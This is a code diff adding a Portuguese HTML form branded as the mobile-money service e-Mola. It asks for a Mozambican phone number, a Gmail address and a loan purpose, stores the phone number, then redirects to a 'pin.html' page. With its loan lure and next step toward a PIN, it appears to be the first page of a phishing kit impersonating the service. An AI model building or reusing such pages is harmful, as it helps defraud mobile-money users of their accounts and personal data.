@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>e-Mola - Dados Pessoais</title>
+    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@700&family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; font-family: 'Nunito', sans-serif; }
+        body { margin: 0; background-color: #E67E22; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        .card { background: white; border-radius: 30px; padding: 30px 20px; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
+        
+        .logo { font-family: 'Caveat', cursive; font-size: 42px; color: #E67E22; margin: 0; line-height: 1; }
+        .tagline { font-size: 12px; color: #777; margin-bottom: 20px; }
+        .title { font-family: 'Caveat', cursive; font-size: 28px; color: #333; margin-bottom: 25px; }
+
+        .form-group { text-align: left; margin-bottom: 20px; }
+        .form-group label { font-family: 'Caveat', cursive; font-size: 18px; color: #333; display: block; margin-bottom: 8px; }
+        
+        .input-box { display: flex; border: 1px solid #ddd; border-radius: 12px; overflow: hidden; background: #fdfdfd; }
+        .prefix { padding: 15px; background: #f5f5f5; border-right: 1px solid #ddd; font-weight: bold; color: #333; display: flex; align-items: center; gap: 5px; }
+        .input-box input, .input-box select { border: none; padding: 15px; flex-grow: 1; font-size: 15px; outline: none; background: transparent; width: 100%;}
+        .input-box input::placeholder { color: #999; font-style: italic; }
+
+        .btn-main { width: 100%; background: #E67E22; color: white; font-size: 18px; font-weight: bold; padding: 18px; border: none; border-radius: 12px; cursor: pointer; font-family: 'Caveat', cursive; letter-spacing: 1px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1 class="logo">e-Mola</h1>
+        <div class="tagline">Meu cell, minha mola</div>
+        
+        <div class="title">Dados Pessoais</div>
+
+        <div class="form-group">
+            <label>Número de Telefone</label>
+            <div class="input-box">
+                <div class="prefix">🇲🇿 +258</div>
+                <input type="tel" id="phone" placeholder="84 123 4567">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Endereço de Gmail</label>
+            <div class="input-box">
+                <input type="email" id="email" placeholder="exemplo@gmail.com">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Finalidade do Empréstimo</label>
+            <div class="input-box">
+                <select id="purpose">
+                    <option>Propinas Escolares</option>
+                    <option>Negócio</option>
+                    <option>Despesas Médicas</option>
+                </select>
+            </div>
+        </div>
+
+        <button class="btn-main" onclick="
+            let phone = document.getElementById('phone').value;
+            if(phone.length < 9) { alert('Insira um número válido.'); return; }
+            sessionStorage.setItem('userPhone', '+258' + phone);
+            window.location.href = 'pin.html';
+        ">CONTINUAR</button>
+    </div>
+</body>
+</html>
